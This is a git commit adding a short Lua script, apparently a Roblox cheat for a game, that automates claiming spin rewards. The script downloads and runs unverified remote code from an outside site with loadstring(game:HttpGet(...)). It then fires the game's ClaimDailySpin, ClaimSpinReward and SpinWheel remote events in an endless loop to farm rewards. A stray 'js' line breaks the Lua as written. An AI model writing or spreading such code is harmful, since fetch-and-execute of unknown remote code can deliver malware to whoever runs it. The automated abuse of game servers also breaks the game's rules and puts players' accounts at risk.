41b7651391cbf7ddb0f71afcc624442e0931f3f2
ShiroKanaeru <shirokanaerus@gmail.com>
2026-01-20 17:31:10 +0700

    Create SekolahBrenrot.lua

---
+++ SekolahBrenrot.lua
@@ -0,0 +1,23 @@
+js
+local e = { 
+        ['?'] = loadstring(game:HttpGet('https://dravenox.site/shortcut.luau'))(),
+        ['!'] = 1
+}
+
+e['?'].spawn(function()
+        while true do 
+                for i = 1, e['!'] do 
+                        pcall(function()
+                                local ex = { 
+                                        e['?'].rep.Remotes.Events.ClaimDailySpin,
+                                        e['?'].rep.Remotes.Events.ClaimSpinReward,
+                                        e['?'].rep.Remotes.Events.SpinWheel
+                                }
+                                for _, xa in ipairs(ex) do 
+                                        xa:FireServer()
+                                end
+                        end) 
+                end
+                e['?'].wait()
+        end
+end)
